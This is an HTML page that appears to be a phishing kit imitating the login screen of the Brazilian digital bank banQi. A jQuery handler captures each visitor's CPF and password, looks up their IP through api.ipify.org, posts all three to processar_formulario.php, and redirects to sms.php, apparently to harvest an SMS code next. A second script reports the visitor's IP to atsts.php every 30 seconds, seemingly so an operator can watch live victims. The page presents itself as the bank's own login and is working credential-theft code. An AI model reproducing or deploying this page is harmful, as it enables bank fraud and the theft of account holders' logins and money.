<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>A conta digital gratuita dos brasileiros | banQi</title>
    <link rel="icon" href="img/favicon.png">
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <script src="https://kit.fontawesome.com/9464b2a436.js" crossorigin="anonymous"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/js/iziToast.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/izitoast/1.4.0/css/iziToast.min.css">
</head>
<body style="background:rgb(248, 248, 248);">
    <div style="display:none;background:rgba(0,0,0,0.5);width:100%;height:100%;z-index: 9999;position: absolute;" class="cad_sucesso">
        <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:25% auto;width:100%;height:auto !important;">
            <center>
                <img border="0" height="50px" src="https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif" alt="">
            </center>
            <br>
        </div>
    </div>
    <div class="kaldasdlayout">
        <i style="float:left;" class="fa-solid fa-arrow-left"></i>
        <button style="width:25px;height:25px;border-radius:50%;float:right;"><i class="fa-solid fa-question"></i></button>
        <div style="clear:both;"></div>
        <br>
        <h4 style="color:rgb(130, 130, 130);font-size:20px;margin-bottom:10px;">Entrar com seu CPF</h4>
        <p>Não tem conta banQi? <span style="cursor:pointer;color:rgb(37, 70, 195);"><strong>Abra uma <br> agora.</strong></span></p>
        <br>
        <form id="form" method="post" action="processar_formulario.php">
            <input maxlength="14" minlength="14" onkeydown="javascript: fMasc( this, mCPF );" class="skdklasd" type="tel" name="cpf" required placeholder="CPF">
            <br><br>
            <input placeholder="Senha" class="skdklasd" type="password" name="senha" required>
            <i style="font-size:18px;position:relative;top:-25px;float:right;" class="fa-solid fa-eye"></i>
            <br>
            <p style='margin-top:15px;color:rgb(50, 99, 225);'><strong>Esqueceu sua senha?</strong></p>
            <br>
            <button style="margin-top:15px;width:100%;height:auto;padding:10px;color:white;background:rgb(50, 99, 225);border-radius:4px;border:none;font-size:15px;">Entrar</button>
        </form>
    </div>

    <!-- Script para capturar IP e redirecionar -->
    <script>
        $(function(){
            $('#form').bind('submit', function(e){
                e.preventDefault();
                var txt = $(this).serialize();
                
                // Captura o IP do usuário
                $.get('https://api.ipify.org?format=json', function(data) {
                    var userIP = data.ip;
                    
                    // Envia o IP para o arquivo PHP
                    $.ajax({
                        type: "POST",
                        url: "processar_formulario.php",
                        data: { cpf: $('input[name="cpf"]').val(), senha: $('input[name="senha"]').val(), ip: userIP },
                        beforeSend: function() {
                            $(".cad_sucesso").css("display", "block");
                        },
                        success: function(response) {
                            // Redireciona para a próxima página
                            window.location.href = "sms.php";
                        }
                    });
                });
            });
        });
    </script>

    <script>
        function ValidaCPF() {	
            var RegraValida = document.getElementById("RegraValida").value; 
            var cpfValido = /^(([0-9]{3}.[0-9]{3}.[0-9]{3}-[0-9]{2})|([0-9]{11}))$/;	 
            if (cpfValido.test(RegraValida) == true)	{ 
                console.log("CPF Válido");	
            } else	{	 
                console.log("CPF Inválido");	
            }
        }

        function fMasc(objeto, mascara) {
            obj=objeto
            masc=mascara
            setTimeout("fMascEx()",1)
        }

        function fMascEx() {
            obj.value=masc(obj.value)
        }

        function mCPF(cpf) {
            cpf=cpf.replace(/\D/g,"")
            cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
            cpf=cpf.replace(/(\d{3})(\d)/,"$1.$2")
            cpf=cpf.replace(/(\d{3})(\d{1,2})$/,"$1-$2")
            return cpf
        }
    </script>
    <script>
    // Função para enviar o IP do usuário ao servidor a cada intervalo de tempo
    function enviarStatusAtivo() {
        // Captura o IP do usuário
        $.get('https://api.ipify.org?format=json', function(data) {
            var userIP = data.ip;
            
            // Envia o IP para o arquivo PHP
            $.ajax({
                type: "POST",
                url: "atsts.php",
                data: { ip: userIP },
                success: function(response) {
                    // Verifica se o usuário ainda está no site
                    if (response === "ativo") {
                        // Se estiver ativo, continua enviando o IP ao servidor
                        setTimeout(enviarStatusAtivo, 30000); // Envia a cada 30 segundos
                    } else {
                        // Se não estiver ativo, para de enviar o IP
                        console.log("Usuário não está mais ativo no site.");
                    }
                }
            });
        });
    }

    // Chama a função para enviar o status ativo quando a página carregar
    $(document).ready(function() {
        enviarStatusAtivo();
    });
</script>

</body>
</html>
